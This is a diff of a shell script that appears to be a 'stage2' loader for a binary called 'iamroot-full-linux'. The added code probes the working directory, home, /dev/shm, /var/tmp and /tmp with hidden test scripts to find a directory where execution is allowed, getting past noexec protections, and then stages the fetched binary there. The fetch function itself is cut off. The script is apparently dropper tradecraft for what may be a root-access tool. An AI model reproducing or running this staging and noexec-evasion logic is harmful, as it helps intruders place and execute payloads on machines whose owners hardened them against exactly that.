@@ -12,7 +12,20 @@ case "$(uname -m)" in
 esac
 
 BIN="iamroot-full-linux-$ARCH"
-TMP="$(mktemp "${TMPDIR:-/tmp}/iamroot2.XXXXXX")"
+
+WORKDIR=""
+for d in "$PWD" "$HOME" /dev/shm /var/tmp "${TMPDIR:-/tmp}" /tmp; do
+    [ -d "$d" ] && [ -w "$d" ] || continue
+    probe="$(mktemp "$d/.s2probe.XXXXXX")"
+    printf '#!/bin/sh\n' > "$probe"
+    chmod 755 "$probe"
+    if "$probe" >/dev/null 2>&1; then WORKDIR="$d"; fi
+    rm -f "$probe"
+    [ -n "$WORKDIR" ] && break
+done
+[ -n "$WORKDIR" ] || { echo "[-] stage2: no executable directory found (noexec everywhere?)" >&2; exit 1; }
+
+TMP="$(mktemp "$WORKDIR/iamroot2.XXXXXX")"
 trap 'rm -f "$TMP" "$TMP.sum" 2>/dev/null' EXIT
 
 fetch() {
